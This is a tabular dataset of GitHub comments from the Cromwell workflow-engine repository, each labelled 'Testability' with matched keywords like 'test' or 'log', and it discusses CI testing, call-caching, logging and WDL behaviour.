Testability,@andy7i pinging you as this is also a great perfomance test,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3712#issuecomment-393634397:55,test,test,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3712#issuecomment-393634397,1,['test'],['test']
Testability,"@antonkulaga @cjllanwarne ; I have tested call-caching with hardlinks and cached-copy strategy. For hashing-strategy I used path+modtime. These were the results for the call-caching:. **It works!**. So this part of the docs should be updated indeed. I have no idea why it works though, so I am a bit hesitant to add it to the docs. @cjllanwarne Do you know if anything changed in the code base that made the call-caching work for hard links?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4077#issuecomment-513136831:35,test,tested,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4077#issuecomment-513136831,1,['test'],['tested']
Testability,"@antonkulaga Thanks, let me know. It occurred to me that `parentWorkflowId` might not show up in the subworkflow's metadata (as opposed to calling metadata directly on that subworkflow's workflow id). But I haven't been in a position to test it myself.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4667#issuecomment-464891063:237,test,test,237,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4667#issuecomment-464891063,1,['test'],['test']
Testability,"@antonkulaga We always welcome PRs! It's not obligated though, even if you use BioWDL :wink: . On-topic: Yes, I think Cromwell could modify the input folder and its contents to be read-only . But that might have some unforeseen consequences down the line. This would need to be tested.; DISCLAIMER: I am not of the cromwell team. So I will not implement this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5482#issuecomment-618842438:278,test,tested,278,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5482#issuecomment-618842438,1,['test'],['tested']
Testability,"@antonkulaga We don't get a lot of usage of the /logs endpoint and considering removing it, so feel free to re-open with use cases for this endpoint.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2917#issuecomment-475726926:49,log,logs,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2917#issuecomment-475726926,1,['log'],['logs']
Testability,"@antonkulaga any hint on what part specifically ? FWIW this is not intended to be run on a docker swarm but rather provide something to test multi-cromwell on single database. It's really more of ""development level"" type of script.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4044#issuecomment-417448888:136,test,test,136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4044#issuecomment-417448888,1,['test'],['test']
Testability,"@breilly2 @mcovarr Thanks for the suggestions today. This PR now splits up the single `sbt` matrix entry into `engine`, `server`, `services`, and ""the rest"". Each matrix entry runs a single `sbt` for all of the respective tests, even ""the rest"". The [results](https://travis-ci.com/github/broadinstitute/cromwell/builds/221571489) seem to have helped memory pressure in that there were no failed jobs with `Killed`, and helped wall time:; - `BUILD_SBT_INCLUDE=engine`; `25 min 34 sec`; - `BUILD_SBT_INCLUDE=server`; `25 min 30 sec`; - `BUILD_SBT_INCLUDE=services`; `23 min 45 sec`; - `BUILD_SBT_EXCLUDE='engine|server|services'`; `31 min 21 sec`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6194#issuecomment-809800879:222,test,tests,222,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6194#issuecomment-809800879,1,['test'],['tests']
Testability,"@cahrens Yes you are right. If we could somehow add the list of files that were deleted in that message or some other log message, in my opinion, it would be useful for debugging to figure out which files being deleted were associated with which workflow. But if you think it could be a lot of messages to add then I am fine with not adding it 👍",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6538#issuecomment-934765674:118,log,log,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6538#issuecomment-934765674,1,['log'],['log']
Testability,"@ccarrizo It's more that users & operators might want to be able to see that behavior. . For instance imagine something sitting on top of a cromwell server where they know there's a single backend, they might want to build business logic about specifics of that backend. One could argue over whether or not that's a good thing but the truth is that it's already a reality so one way or the other it needs to remain. Another example would be for operational/debugging bits. As an example some of the data we track which is JES specific has been invaluable when dealing w/ our friends on the other side of the fence in terms of figuring out what's gone awry as both pieces were being built. . The primary reason I can think of to record what type of backend was used to dispatch would mainly be for informational purposes, although I could imagine what backend a call had been run on being part of a potential cost function on determining which backend a subsequent call would be applied to. For both situations you'd only need to store the backend name, not fundamentally link metadata to that backend but it's easy enough to do both in a single table schema.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/427#issuecomment-182476331:232,log,logic,232,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/427#issuecomment-182476331,1,['log'],['logic']
Testability,"@cjllanwarne #811 #812 for Local and JES config sanity checking, #813 to create filesystems in the initialization actor. The logging issue might be better suited for discussion prior to ticketing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/797#issuecomment-217980738:125,log,logging,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/797#issuecomment-217980738,1,['log'],['logging']
Testability,"@cjllanwarne - Here goes... This works:; ```; workflow wf {; call tsk {; input: foo=""Hello"", bar=""World""; }; }; task tsk {; String foo; String? bar; command {; echo ""${foo} ${""here comes bar"" + bar}""; }; }; ```; This doesn't:; ```; workflow wf {; call tsk {; input: foo=""Hello""; }; }; task tsk {; String foo; String? bar; command {; echo ""${foo} ${""here comes bar"" + bar}""; }; }; ```. When `bar` is left out, job stays in the running state, and exceptions are continually thrown in the server logs.; The wdl validates fine.; Thanks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1830#issuecomment-272077981:493,log,logs,493,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1830#issuecomment-272077981,1,['log'],['logs']
Testability,"@cjllanwarne .The `relative_output_paths_colliding.test` will report a succeeded workflow, but cromwell will exit with non-zero status because of the copying. This means that `metadata {status: Failed}` is not entirely correct in this case. (Which makes the CI tests fail).; Is there a way to test the cromwell exit code in centaur?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4815#issuecomment-482033914:51,test,test,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4815#issuecomment-482033914,3,['test'],"['test', 'tests']"
Testability,@cjllanwarne @Horneth I did the changes in order to evaluate expressions based on @Horneth recommendation (Could you review it?). I also created a couple of tests cases for LocalBackend so you can see the whole idea behind it.; I will continue adding all needed tests for all supported backends and once they are in place I will let you know to review the whole PR so then I can merge it.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212150073:157,test,tests,157,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212150073,2,['test'],['tests']
Testability,"@cjllanwarne @aednichols Looks like the tests didn’t complete with the same error, I gave merging from develop another crack without success. Hopefully it’s all good though 😬",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5494#issuecomment-655750203:40,test,tests,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5494#issuecomment-655750203,1,['test'],['tests']
Testability,"@cjllanwarne @dinvlad I just assumed that everything inside of `workflow-options` is automatically a default -- so for example if there ways a key ""monitoring_script"" in there (not nested inside a `default` stanza but directly inside the `workflow-options` stanza) -- then that gets applied as a default. Is that what you see from your testing?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4151#issuecomment-424945194:336,test,testing,336,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4151#issuecomment-424945194,1,['test'],['testing']
Testability,@cjllanwarne @geoffjentry do we need to keep inputs/outputs in the Cromwell logs?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1002#issuecomment-226487250:76,log,logs,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1002#issuecomment-226487250,1,['log'],['logs']
Testability,@cjllanwarne @kshakir could either of you merge this if your reviews have been resolved and tests pass?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3806#issuecomment-400031053:92,test,tests,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3806#issuecomment-400031053,1,['test'],['tests']
Testability,"@cjllanwarne @salonishah11 . From my understanding -- When we send a URI to martha, be it ""dos://"" or ""drs://"" -- I think it just returns a response json that has a key `dos` in it, and that's the `DosObject` in our codebase. The object is to encapsulate the response json and not the URI, and I believe the URi may not be returned at all but Saloni did some tests. Might be worth posting example responses here for education.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5149#issuecomment-526644592:359,test,tests,359,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5149#issuecomment-526644592,1,['test'],['tests']
Testability,@cjllanwarne @salonishah11 this is really fixed now and ready for re-review. The Google errors provided by customers have `\n` in them which our regexes did not match. Fixed the regex and updated test cases to match the actual error.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6155#issuecomment-765013961:196,test,test,196,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6155#issuecomment-765013961,1,['test'],['test']
Testability,"@cjllanwarne @tcibinan . A few thoughts -- as a user, I think I'd pair this flag with `localization_optional` set to true so that files don't actually get localized, and I can do something like my own mounting logic in the command section (which involves making new WDL tasks to take advantage of this feature). However, assuming the i/o of FUSE is something that is really helpful and a popular choice, you can imagine that the next iteration of this feature takes it to the next level and you can imagine any ""File"" type object is mounted rather than the mounting logic embedded directly into the command. This means more people can take advantage of this feature without modifying commands. Perhaps the third iteration would take into account call caching -- but that's a problem for the future.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5343#issuecomment-593587452:210,log,logic,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5343#issuecomment-593587452,2,['log'],['logic']
Testability,"@cjllanwarne Checkout out #199, a PR into this PR. It refactors `DataAccess`, `Backend`, and `BackendType` around a bit such that the high level workflow manager actor can pass in its data access instance to the backend, OR the various test suites can keep using separate data access instances. . The problem with ""data_access_singleton"" is that the singleton data access seemingly cannot handle the onslaught of our multi-threaded tests. One of our many thread pools around the database seemed to then start returning uncaught(?) errors. Definitely showed some warts in our non-existent load testing... Take a look, decide what you want to keep or jettison, but I do believe that a new database pool / data access should **NOT** be created for each JES `Run`. Otherwise, this branch looks good to go for merge. :+1:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143000894:236,test,test,236,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143000894,3,['test'],"['test', 'testing', 'tests']"
Testability,@cjllanwarne For my Wash U stuff I've now added some tests. I'm not sure what's involved for a test on this.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3438#issuecomment-374916603:53,test,tests,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3438#issuecomment-374916603,2,['test'],"['test', 'tests']"
Testability,"@cjllanwarne GCS is not backend specific, which is actually what makes it possible to use GCS on local backend.; We could extract the ""File system logic"" from the WorkflowDescriptor but anything related to GCS will depend on a workflow descriptor because of all the auth stuff",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/361#issuecomment-170675299:147,log,logic,147,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/361#issuecomment-170675299,1,['log'],['logic']
Testability,@cjllanwarne I added a test - is that the kind of thing you were after?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1704#issuecomment-263474909:23,test,test,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1704#issuecomment-263474909,1,['test'],['test']
Testability,"@cjllanwarne I admittedly didn't turn on the ones which would require a specialized test (i.e. involves S3) even though I believe they should now work. I was going to follow that up later on, mainly being lazy about getting the files in appropriate places",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4790#issuecomment-479620382:84,test,test,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4790#issuecomment-479620382,1,['test'],['test']
Testability,"@cjllanwarne I certainly don't think this needs a unit test for a hotfix. And as there was no unit test added for the introduction of the queue, and many unit and virtually all integration tests exercise this indirectly I'm not sure I see the necessity.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5510#issuecomment-624861371:55,test,test,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5510#issuecomment-624861371,3,['test'],"['test', 'tests']"
Testability,@cjllanwarne I do think the existing test suite should validate this sufficiently apart from the issues raised in the separate Google Doc regarding retries and the probabilities of failure with transferring multiple files.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5141#issuecomment-524990707:37,test,test,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5141#issuecomment-524990707,1,['test'],['test']
Testability,"@cjllanwarne I don't know why the `docker_hash_quay` test is failing, but I don't think this is related to my changes.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3354#issuecomment-370592084:53,test,test,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3354#issuecomment-370592084,1,['test'],['test']
Testability,@cjllanwarne I got rid of the separate boolean and tried to make restart token logging work like execution token logging.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6590#issuecomment-1004833002:79,log,logging,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6590#issuecomment-1004833002,2,['log'],['logging']
Testability,@cjllanwarne I have added the `workflow-with-no-task` test in the [develop](https://github.com/broadinstitute/cromwell/pull/5458) version of this PR.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5465#issuecomment-606683493:54,test,test,54,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5465#issuecomment-606683493,1,['test'],['test']
Testability,"@cjllanwarne I have seen these errors before. It happens when you use a java version that is higher than 8. (My OS has 11 installed by default, and I use a conda environment to use OpenJDK 8 on intellij). So it may be an update of travis CI's default image. . EDIT: Hmm I checked the `.travis.yml` and the openjdk8 is explicitly specified. Really weird that a higher version of java is used. EDIT2: And the compilation works again. Sometimes it is best to let a restart do the work :wink:. The errors that occur now is because quay.io is down, and related tests fail. https://status.quay.io/",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5495#issuecomment-630613015:556,test,tests,556,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5495#issuecomment-630613015,1,['test'],['tests']
Testability,"@cjllanwarne I have updated the documentation and the only test on Travis that fails is related to relative imports on CWL, so not something in this PR. I have tested the strategies in real life and found no problems. I see no ""ready for review"" label, and the ""on-deck for review label"" prioritizes the PR (which I feel I am not in a position to do). What is the usual process for declaring the PR ready?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-601606406:59,test,test,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-601606406,2,['test'],"['test', 'tested']"
Testability,@cjllanwarne I just added a centaur test. I used the metadata to check the instance type on JES but I could see about using unix commands too.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3077#issuecomment-352869302:36,test,test,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3077#issuecomment-352869302,1,['test'],['test']
Testability,@cjllanwarne I removed the `path` prefixing and added tests for `location` in `default`.; Also added the file prefixing to CWL workflows (was only for input files before). If @danbills's PR on cwltool gets merged and we can salad CWL workflows with gcs path it should unlock at least another test I believe.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3171#issuecomment-359483234:54,test,tests,54,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3171#issuecomment-359483234,2,['test'],"['test', 'tests']"
Testability,@cjllanwarne I see the `workflow_type_and_version_cwl` test but so far as I can tell it is testing that such parameters are accepted by cromwell. . It is curious that it passes though because it is actually passing in a WDL file! We should likely disallow this.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2843#issuecomment-345267188:55,test,test,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2843#issuecomment-345267188,2,['test'],"['test', 'testing']"
Testability,"@cjllanwarne I would like to rebase my PR ~~with~~ on your branch, and merge it into yours (stuff where I'm populating the Call -> Assignment map + some tests). Do you think that's fine?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/707#issuecomment-210641359:153,test,tests,153,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/707#issuecomment-210641359,1,['test'],['tests']
Testability,@cjllanwarne I'm going to go out on a limb and say that the test failure had nothing to do with this change. Just a guess.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/718#issuecomment-212408133:60,test,test,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/718#issuecomment-212408133,1,['test'],['test']
Testability,@cjllanwarne I'm ok with that as long as we're ok with not persisting the JES return code at all until this other ticket is addressed - which IMO is not a huge deal since we print it in the logs so it's not completely lost anyway if we need to debug.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/447#issuecomment-184764627:190,log,logs,190,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/447#issuecomment-184764627,1,['log'],['logs']
Testability,"@cjllanwarne I'm probably misreading the convo but I was reading this to imply that a cromwell-singleton data access object would be getting hit harder from running our unit tests in terms of connections than real life, but in the latter we could conceivably have many thousands of workflows (and thus many, many thousands of tasks) banging on the DB simultaneously. A teensy threadpool isn't going to be able to handle the latter case. Another possibility (which we originally looked at but discarded for non-singleton data access) is to have an actual data access actor, and then that actor can scale horizontally as needed via a router actor. those actors can even be on different machines if CPU load is an issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143033225:174,test,tests,174,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143033225,1,['test'],['tests']
Testability,@cjllanwarne Indeed `read_map` and `write_map` was not being tested in centaur. I will migrate this test.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3474#issuecomment-378990425:61,test,tested,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3474#issuecomment-378990425,2,['test'],"['test', 'tested']"
Testability,@cjllanwarne It still runs all the tests! . ... And then I realized that altering `src/ci/bin/test.sh` is not included in the regex... Oh well I solved this problem for the next documentation PR then :wink:.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-628462648:35,test,tests,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-628462648,2,['test'],"['test', 'tests']"
Testability,"@cjllanwarne It'd be helpful if you could add a description of how this is intended to work, I can kinda see it in the tests but want to make sure I'm not interpreting things incorrectly",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3738#issuecomment-395469732:119,test,tests,119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3738#issuecomment-395469732,1,['test'],['tests']
Testability,"@cjllanwarne My centaur comment was more that ideally we'd be testing every function in centaur. I'm sure this wouldn't be the first one we're slacking on, don't let me hold you up.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2422#issuecomment-314422336:62,test,testing,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2422#issuecomment-314422336,1,['test'],['testing']
Testability,"@cjllanwarne Really it's just that they were developed simultaneously, and it's probably my fault for not going back and cleaning the other one up. In retrospect I knew it existed, but probably just lost track of it. I certainly wouldn't disapprove of converting future-based logic in actors into a more actor-y solution but that's because IMO it's easier to reason about multiple actors (and their messages) than composed Futures. My stance isn't one which is universally held, however",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1004#issuecomment-226012998:276,log,logic,276,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1004#issuecomment-226012998,1,['log'],['logic']
Testability,"@cjllanwarne Sorry for the delay in response, I was offline over the Xmas break.; ; > Question: Does the new test actually depend on connecting to external AWS resources? . The short answer is no, it doesn't depend on actually connecting to AWS resources. . However it does require the AWS_REGION environment variable to be set so that the SDK initializes. So if it is run without AWS_REGION the test fails, if it is run with AWS_REGION it works (but doesn't actually connect to AWS). Assuming that your regular CI builds don't set the AWS env variables, it is probably simplest to leave it tagged as an AwsTest.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5216#issuecomment-575101509:109,test,test,109,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5216#issuecomment-575101509,4,['test'],['test']
Testability,"@cjllanwarne Sort does not solve the purpose here because it is not what backend expecting and want,However it is expecting the right dependencies as specified in the wdl. . Because wdl writer may not right alphabetically or numeric order for call name it could be something logical name or else. I still don't get how sorting would work.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1214#issuecomment-236009348:275,log,logical,275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1214#issuecomment-236009348,1,['log'],['logical']
Testability,"@cjllanwarne Thanks for fixing this so fast. For validation I just skip version 32 ;) When is 33 planned?. We want to upgrade to wdl 1.0 anyway but first need to complete our testing framework around wdl, see also https://github.com/biopet/biowdl-test-utils (library) and https://github.com/biowdl/QC (real pipeline with testing)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3762#issuecomment-398279541:175,test,testing,175,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3762#issuecomment-398279541,3,['test'],"['test-utils', 'testing']"
Testability,"@cjllanwarne Thanks for the clarification. I was already wondering why you would negate your own well-written namespace code with a single line... Anyway I created a pull request on the spec here: https://github.com/openwdl/wdl/pull/347, your feedback would be much appreciated. Here's to hoping that it gets unanimously approved :crossed_fingers: . @geoffjentry yes, the Cromwell team has a lot of influence on the spec by implementing or not implementing things. I can understand the temptation to use this for ""the greater good"" :wink: . But I am quite happy that the Cromwell developers chose to be in touch with the community and aggressively implement the development spec in the development version of Cromwell. This allows us to see how certain spec changes turn out *before* they get implemented in production. In this case I came across this when I was testing the code for #5312 and found that I could not set my resource requirements for BWA anymore (in BioWDL all tasks default to the least number of cores needed, and sometimes you want to override this for more power). Since BWA was nested in a subworkflow this turned out not to be possible. So now we can fix the spec and Cromwell before this ever gets into a release. I think it is great work by the Cromwell team. It can't always be easy to follow the spec that closely.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5317#issuecomment-564426176:863,test,testing,863,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5317#issuecomment-564426176,2,['test'],['testing']
Testability,"@cjllanwarne Thanks for the explanation! Exactly right, this is what the script says: ; #!/bin/bash; export _JAVA_OPTIONS=-Djava.io.tmpdir=/cromwell_root/tmp; export TMPDIR=/cromwell_root/tmp; cd /cromwell_root. echo ""Hello foobar!"" && exit 1; echo $? > job.rc.txt. @pgrosu The exit 1 was the purpose here - I was modifying the basic hello.wdl test, trying to do a lightweight test simulating the failure of the binary being called. Turns out, as @cjllanwarne explains, that exit 1 is not a good way to simulate that, because it defeats Cromwell's return-code monitoring. Here's a better test, which does work as expected: . task hello {; String addressee; command {; echo ""Hello ${addressee}!"" && head nonexistent; }; output {; String salutation = read_string(stdout()); }; runtime {; docker: ""ubuntu:latest""; continueOnReturnCode: true; }; }. workflow w {; call hello; }",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-175739792:344,test,test,344,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-175739792,3,['test'],['test']
Testability,"@cjllanwarne Thanks for your extensive information on how to write tests. I would love to have written a test, but I could not find anything related in `engine/src/test` and I indeed have no experience with centaur. I will write a test right away.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4815#issuecomment-481624286:67,test,tests,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4815#issuecomment-481624286,4,['test'],"['test', 'tests']"
Testability,"@cjllanwarne The issue was that reality had diverged from the mock, so the unit tests were testing fantasy land in the first place. The code was already doing something completely different in that situation, the test now just reflects that.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4431#issuecomment-442476469:62,mock,mock,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4431#issuecomment-442476469,4,"['mock', 'test']","['mock', 'test', 'testing', 'tests']"
Testability,"@cjllanwarne While I can see the instances that Cromwell has spawned, those instances are not named or labeled in a way that would let me identify which log file to look at. This is unlike, say, dsub, which labels each machine in a way that makes it easy to tell which specific task and chunk it belongs to. So, while I can see those machines sitting there idling, I can't easily go look and tell what's in their logfiles. For that same reason, I can't really answer your questions as well as I'd like to be able to.; 1. To the best of my knowledge, jobs don't fail during this process (aside from the usual preemptible instance terminations), but I can't go from google compute instance => log file.; 1. I do believe that *at least some* of the jobs become created in duplicate. I believe this because (for example), in a job where I scattered into 2,400 chunks, I saw over 3,500 live VMs running. (There is no additional scattering or other reason for the number of machines to be more than 2,400 in that particular circumstance.). If Cromwell added a label to these machines in the way that dsub does, I think I could do a much better job answering your questions.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4914#issuecomment-488421027:153,log,log,153,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4914#issuecomment-488421027,3,['log'],"['log', 'logfiles']"
Testability,@cjllanwarne You're already on thin ice w/ test recommendations,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3971#issuecomment-410756326:43,test,test,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3971#issuecomment-410756326,1,['test'],['test']
Testability,"@cjllanwarne about the migration that's a good point. I think we're going to want to add that and warn firecloud of the change.; Also looks like we're already using `""null""` in centaur in multiple tests so I'll have to change that",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2546#issuecomment-322291846:197,test,tests,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2546#issuecomment-322291846,1,['test'],['tests']
Testability,@cjllanwarne and @Horneth I have rebased with the latest develop. Awaiting you guys approvals now. ; Also for some reason the tests have started failing locally for mw (files which are irrelevant for this PR). I checked out the latest develop separately and it also seems to fail there. Still looking into it but not sure how to proceed with that.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/743#issuecomment-216383637:126,test,tests,126,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/743#issuecomment-216383637,1,['test'],['tests']
Testability,@cjllanwarne did you not see the set of call caching centaur tests which were enabled by this PR?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4790#issuecomment-479618819:61,test,tests,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4790#issuecomment-479618819,1,['test'],['tests']
